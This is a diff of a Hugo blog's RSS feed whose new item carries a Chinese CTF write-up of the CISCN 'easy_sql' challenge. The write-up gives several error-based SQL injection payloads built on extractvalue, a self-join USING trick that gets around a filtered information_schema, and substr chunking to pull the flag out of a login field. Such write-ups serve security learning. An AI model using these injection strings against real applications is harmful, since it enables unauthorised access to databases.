@@ -1,14 +1,19 @@
-<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
-    <channel>
-        <title>Php原生类 - 标签 - Braindance</title>
-        <link>http://localhost:1313/tags/php%E5%8E%9F%E7%94%9F%E7%B1%BB/</link>
-        <description>Php原生类 - 标签 - Braindance</description>
-        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Wed, 18 Aug 2021 17:21:24 &#43;0800</lastBuildDate><atom:link href="http://localhost:1313/tags/php%E5%8E%9F%E7%94%9F%E7%B1%BB/" rel="self" type="application/rss+xml" /><item>
-    <title>CISCN线上赛库存</title>
-    <link>http://localhost:1313/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</link>
-    <pubDate>Wed, 18 Aug 2021 17:21:24 &#43;0800</pubDate><author>
-        <name>Braindance</name>
-    </author><guid>http://localhost:1313/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</guid>
-    <description><![CDATA[easy_sql在用户名处，尝试sql注入，加上单引号报错，]]></description>
-</item></channel>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Php原生类 on </title>
+    <link>/tags/php%E5%8E%9F%E7%94%9F%E7%B1%BB/</link>
+    <description>Recent content in Php原生类 on </description>
+    <generator>Hugo</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 18 Aug 2021 17:21:24 +0000</lastBuildDate>
+    <atom:link href="/tags/php%E5%8E%9F%E7%94%9F%E7%B1%BB/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>CISCN线上赛库存</title>
+      <link>/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</link>
+      <pubDate>Wed, 18 Aug 2021 17:21:24 +0000</pubDate>
+      <guid>/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</guid>
+      <description>easy_sql 在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是括号单引号闭合&#xA;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &amp;lsquo;1&amp;rsquo;) LIMIT 0,1&amp;rsquo; at line 1&#xA;过滤的字符有union，所以尝试报错注入，查询版本号。&#xA;admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select version()),0x7e)))# 接下来想要通过information_schema库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。&#xA;最后参考了网上的一篇文章：mysql 注入 information_schema_绕过IDS过滤information_schema继续注入，模仿文章构造payload&#xA;admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))# 回显为：Duplicate column name &amp;rsquo;no&amp;rsquo;，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段&#xA;Duplicate column name &amp;#39;28d9f90a-4120-4ee8-9079-4e7613699510&amp;#39; 直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了&#xA;admin&amp;#39;) and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))# flag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}</description>
+    </item>
+  </channel>
 </rss>
